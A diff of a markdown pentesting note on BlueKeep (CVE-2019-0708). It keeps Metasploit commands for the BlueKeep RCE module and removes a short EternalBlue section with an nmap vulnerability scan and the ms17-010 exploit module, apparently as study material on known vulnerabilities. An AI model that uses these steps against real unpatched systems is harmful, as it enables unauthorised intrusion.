@@ -28,7 +28,7 @@ It is therefore recommended to **only utilize verified exploit code** and module
 
 - The BlueKeep exploit has an *MSF auxiliary module* that can be used **to check if a target system if vulnerable** to the exploit and also has *an exploit module* that can be **used to exploit the vulnerability** on unpatched systems.
 
-# How to Exploit (Manual)
+# How to Exploit (MSF)
 
 1. Check running services, and 3389 by default
 ```bash
@@ -46,17 +46,3 @@ msf> show targets
 msf> set target TARGET_N
 msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 ```
-# How to Exploit (MSF)
-
-1. Check running services, and run vulnerability detection script
-```bash
-sudo nmap -v -A -p- --script=smb-vuln-ms17-010 TARGET_IP
-```
-
-2. Launch Metasploit console
-
-3. Use `exploit/windows/smb/ms_17_010_eternalblue`
-
-4. Set up required options
-
-5. PWN
